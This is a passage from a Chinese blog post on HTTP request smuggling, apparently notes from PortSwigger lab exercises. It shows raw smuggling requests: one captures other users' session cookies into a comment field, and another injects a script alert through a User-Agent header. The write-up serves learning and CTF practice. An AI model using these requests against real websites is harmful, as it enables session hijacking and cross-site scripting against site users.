class="keyword">POST</span> <span class="string">/post/comment</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac771fff1e7151cd80977b71000800a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>665</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=m5fcVJxX7Eqcdq0sE5eccIv4GTQdZILj</span><br><span class="line"></span><br><span class="line">csrf=w7zSB0ypijpVohxpxKcMmKnWQMYNlmrw&amp;postId=3&amp;name=p&amp;email=a%40q.cc&amp;website=http%3A%2F%2Fa.cc&amp;comment=a</span><br></pre></td></tr></table></figure>
<p>然后可以在评论区看到一些别人的cookie信息(也可能是自己的=.=)</p>
<p><img src="1612106890243.png" alt="1612106890243"></p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>X</span><br></pre></td></tr></table></figure>
<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><p>太懒了…,后面遇到再来做这几个实验</p>
<ul>
<li>将 on-site 重定向变为开放式重定向</li>
<li>缓存投毒</li>
<li>缓存欺骗</li>
</ul>
<h2 id="0x-05-总结"><a href="#0x-05-总结" class="headerlink" title="0x 05 总结"></a>0x 05 总结</h2><p>粗略的学习一下</p>
<p>CTF中利用可以利用的应该有bypass,和xss. (这两天某比赛就遇到了一个bypass.</p>
<p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p>
</div><div class="tags"><a href="/tags/http/"><i class="fa fa-tag"></i>http</a><a href="/tags/web%E5%AE%89%E5%85%A8/"><i class="fa fa-tag"></i>web安全</a><a href="/tags/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><i class="fa fa-tag"></i>Http请求走私</a></div><div class="post-nav"><a class="pre" href="/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/">网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入</a><a class="next" href="/2021/01/22/Flask_basic/">狗书阅读笔记(1)</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/WP/" style="font-size: 15px;">WP</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/http/" style="font-size: 15px;">http</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">web安全</a> <a href="/tags/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" style="font-size: 15px;">Http请求走私</a> <a href="/tags/JWT/" style="font-size: 15px;">JWT</a> <a href="/tags/SSTI/" style="font-size: 15px;">SSTI</a> <a href="/tags/SSRF/" style="font-size: 15px;">SSRF</a> <a href="/tags/SSI/" style="font-size: 15px;">SSI</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" style="font-size: 15px;">伪随机数</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 15px;">sql注入</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/Flask/" style="font-size: 15px;">Flask</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 15px;">生活</a> <a href="/tags/%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/" style="font-size: 15px;">参数注入</a> <a href="/tags/nodejs/" style="font-size: 15px;">nodejs</a> <a href="/tags/XXE/" style="font-size: 15px;">XXE</a> <a href="/tags/XML/" style="font-size: 15px;">XML</a> <a href="/tags/jade/" style="font-size: 15px;">jade</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">pickle反序列化</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/flask/" style="font-size: 15px;">flask</a> <a href="/tags/wp/" style="font-size: 15px;">wp</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/03/15/dvCTF2021-writeup/">dvCTF2021-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/12/AntxD-3CTF%E9%83%A8%E5%88%86wp/">AntxD^3CTF部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/12/CTFSHOW-XSS/">CTFShow-XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/23/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3PaddingOracleAttack&&CBC-Byte-Flipping-Attack/">通过一道题了解PaddingOracleAttack&&CBC-Byte-Flipping-Attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/20/%E9%80%9A%E8%BF%87%E5%87%A0%E9%81%93%E9%A2%98%E7%9B%AE%E4%BA%86%E8%A7%A3pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">通过几道题目了解pickle反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/nmap%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/">nmap参数注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/nodejs/">ctfshow web入门 Node WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/08/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96(PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98)/">GWCTF2019枯燥的抽奖-PHP伪随机数问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/07/%5BGYCTF2020%5DFlaskApp&Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/">GYCTF2020-FlaskApp&Flask pin码伪造</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2021 <a href="/." rel="nofollow">L0nm4r|Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/copycode.js" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>